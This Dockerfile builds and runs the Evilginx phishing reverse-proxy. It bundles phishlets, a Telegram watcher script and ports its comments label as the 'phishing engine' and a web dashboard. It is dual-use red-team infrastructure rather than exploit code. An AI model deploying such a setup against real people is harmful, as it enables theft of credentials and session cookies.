# ---------- Build stage ----------
# go.mod in this repo requires go >= 1.25. GOTOOLCHAIN=auto makes Go
# automatically download the exact toolchain version go.mod asks for
# (e.g. 1.25.7) if the image's bundled Go is older.
FROM golang:1.25-alpine AS builder

ENV GOTOOLCHAIN=auto

RUN apk add --no-cache git make gcc musl-dev

WORKDIR /src
COPY . .

RUN go mod tidy
RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /usr/local/bin/evilginx .

# ---------- Runtime stage ----------
FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata bash curl su-exec libcap

# Non-root app user
RUN addgroup -S evilginx && adduser -S evilginx -G evilginx

COPY --from=builder /usr/local/bin/evilginx /usr/local/bin/evilginx
COPY --from=builder /src/phishlets /usr/local/share/evilginx/phishlets
COPY entrypoint.sh /entrypoint.sh
COPY telegram-watch.sh /usr/local/bin/telegram-watch.sh
RUN chmod +x /entrypoint.sh /usr/local/bin/telegram-watch.sh && \
    setcap cap_net_bind_service=+ep /usr/local/bin/evilginx

WORKDIR /app
RUN mkdir -p /app/phishlets /app/sessions /app/certs && \
    chown -R evilginx:evilginx /app

# Entrypoint starts as root (fixes volume ownership), then drops to 'evilginx'
# 53/80/443 = the phishing engine (DNS, HTTP, HTTPS)
# 5000      = the web dashboard
EXPOSE 53/udp 53/tcp 80/tcp 443/tcp 5000/tcp

ENTRYPOINT ["/entrypoint.sh"]
